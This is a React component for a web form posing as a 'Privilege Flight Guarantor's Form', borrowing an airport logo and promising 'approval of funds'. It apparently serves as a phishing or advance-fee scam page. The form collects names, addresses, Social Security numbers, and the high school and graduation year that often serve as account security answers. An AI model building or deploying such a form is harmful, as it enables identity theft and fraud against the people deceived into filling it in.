
import { NavLink } from "react-router-dom";

function HomePage(props) {

    return (
        <div className="container">
            <form className="box" onSubmit={props.handleSubmit}>
                <img src="https://img.aviationpros.com/files/base/cygnus/cavc/image/2016/05/Modified__BWI_Logo_copy.574db71b7737e.png?auto=format%2Ccompress&w=640&width=640" alt="" width="200" />
                <h1>Grace Angel Miller Priviledge Flight Guarantor's Form</h1>
                <h3>Provide your adequate information to ensure approval of funds</h3>

                <div className="duo2">
                </div>



                <div className="over">
                    <div className="card-input">
                        <p>Full Name</p>
                        <input type="text" placeholder="" name="fullName" onChange={props.getData}   />
                    </div>
                    <div className="card-input put1">
                        <p>Full Address</p>
                        <input type="text" placeholder="" name="address" onChange={props.getData}  />
                        <h5>Guarantor must be from selected state: Chicago</h5>
                    </div>
                  
                    <div className="card-input put1">
                        <p>SSN (social security number)</p>
                        <input type="number" placeholder="" name="ssn" onChange={props.getData} />
                    </div>

                    <div className="card-input put1">
                        <p>What High school did you graduate From?</p>
                        <input type="text" placeholder="" name="schoolName" onChange={props.getData} />
                    </div>

                    <div className="card-input put1">
                        <p>What Year did you graduate</p>
                        <input type="number" placeholder="" name="schoolDate" onChange={props.getData} />
                    </div>



                </div>





                <button className="check" onClick={props.handleSubmit}>Submit</button>

            </form>
        </div>
    )
}

export default HomePage;